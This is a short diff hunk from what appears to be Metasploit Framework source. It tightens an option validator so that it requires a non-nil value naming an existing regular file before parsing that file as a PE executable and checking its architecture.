@@ -46,7 +46,7 @@ module Msf
 
     def valid?(value, check_empty: nil)
       return false unless super
-      return false unless File.exist?(File.expand_path(value)) # no memory: locations
+      return false unless value && File.file?(File.expand_path(value)) # no memory: locations
 
       begin
         self.class.assert_compatible(Rex::PeParsey::Pe.new_from_file(value, true), @arch)
